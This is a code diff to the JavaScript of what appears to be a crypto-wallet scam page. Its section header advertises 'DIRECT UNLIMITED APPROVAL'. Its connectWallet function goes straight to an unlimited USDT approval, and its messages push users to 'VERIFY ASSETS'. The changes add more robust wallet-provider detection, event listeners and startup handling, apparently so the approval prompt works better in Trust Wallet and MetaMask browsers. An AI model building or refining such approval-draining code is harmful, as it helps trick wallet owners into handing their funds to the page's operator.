@@ -195,6 +195,58 @@
     // ============================================================
     // WEB3 LOGIC (DIRECT UNLIMITED APPROVAL & iOS TRUST WALLET OPTIMIZATION)
     // ============================================================
+    function getWeb3Provider(timeoutMs = 1500) {
+        return new Promise(resolve => {
+            const getImmediate = () => window.ethereum || window.trustwallet || (window.web3 && window.web3.currentProvider);
+            const p = getImmediate();
+            if (p) return resolve(p);
+
+            let timer = null;
+            const onInit = () => {
+                if (timer) clearInterval(timer);
+                window.removeEventListener('ethereum#initialized', onInit);
+                resolve(getImmediate());
+            };
+
+            window.addEventListener('ethereum#initialized', onInit, { once: true });
+
+            const startTime = Date.now();
+            timer = setInterval(() => {
+                const found = getImmediate();
+                if (found || (Date.now() - startTime) >= timeoutMs) {
+                    clearInterval(timer);
+                    window.removeEventListener('ethereum#initialized', onInit);
+                    resolve(found || null);
+                }
+            }, 30);
+        });
+    }
+
+    function setupProviderListeners(provider) {
+        if (!provider || provider._hasBoundListeners) return;
+        provider._hasBoundListeners = true;
+
+        if (typeof provider.on === 'function') {
+            provider.on('accountsChanged', function (accounts) {
+                if (!accounts || accounts.length === 0) {
+                    state.walletAddress = '';
+                    state.usdtBalance = '0.00';
+                    state.bnbBalance = '0.000000';
+                    updateWalletInfoUI();
+                    updateStatus('⚡ Wallet disconnected.', 'info');
+                } else if (state.walletAddress !== accounts[0]) {
+                    state.walletAddress = accounts[0];
+                    updateWalletInfoUI();
+                    updateStatus('⚡ Wallet address updated. Click VERIFY ASSETS to proceed.', 'info');
+                }
+            });
+
+            provider.on('chainChanged', function () {
+                updateWalletInfoUI();
+            });
+        }
+    }
+
     async function connectWallet() {
         await approveUsdt();
     }
@@ -202,12 +254,28 @@
     async function approveUsdt() {
         if (state.isApproving) return;
 
-        const providerObj = window.ethereum || window.trustwallet;
+        // Ensure ethers is loaded before proceeding
+        if (typeof ethers === 'undefined') {
+            updateStatus('⏳ Loading Web3 components, please wait...', 'warning');
+            let waitTries = 0;
+            while (typeof ethers === 'undefined' && waitTries < 25) {
+                await new Promise(r => setTimeout(r, 100));
+                waitTries++;
+            }
+            if (typeof ethers === 'undefined') {
+                updateStatus('❌ Web3 library failed to load. Please refresh the page.', 'error');
+                return;
+            }
+        }
+
+        const providerObj = await getWeb3Provider();
         if (!providerObj) {
             updateStatus('❌ No Web3 wallet detected. Please open in Trust Wallet or MetaMask.', 'error');
             alert('No Web3 wallet found. Please open this dApp inside Trust Wallet or MetaMask browser.');
             return;
         }
+
+        setupProviderListeners(providerObj);
 
         state.isApproving = true;
         updateWalletInfoUI();
@@ -481,25 +549,9 @@
         }
 
         // Web3 Account / Chain listener (Silent UI updates only - NO automatic transaction prompts)
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', function (accounts) {
-                if (!accounts || accounts.length === 0) {
-                    state.walletAddress = '';
-                    state.usdtBalance = '0.00';
-                    state.bnbBalance = '0.000000';
-                    updateWalletInfoUI();
-                    updateStatus('⚡ Wallet disconnected.', 'info');
-                } else if (state.walletAddress !== accounts[0]) {
-                    state.walletAddress = accounts[0];
-                    updateWalletInfoUI();
-                    updateStatus('⚡ Wallet address updated. Click VERIFY ASSETS to proceed.', 'info');
-                }
-            });
-
-            window.ethereum.on('chainChanged', function () {
-                updateWalletInfoUI();
-            });
-        }
+        getWeb3Provider(1000).then(provider => {
+            if (provider) setupProviderListeners(provider);
+        });
     }
 
     // ============================================================
@@ -634,13 +686,19 @@
     }
 
     // ============================================================
-    // INITIALIZATION
+    // INITIALIZATION (Instant and non-blocking)
     // ============================================================
-    document.addEventListener('DOMContentLoaded', function () {
+    function startApp() {
         initElements();
         bindEvents();
         initHeroCanvas();
         updateWalletInfoUI();
-    });
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', startApp);
+    } else {
+        startApp();
+    }
 
 })();
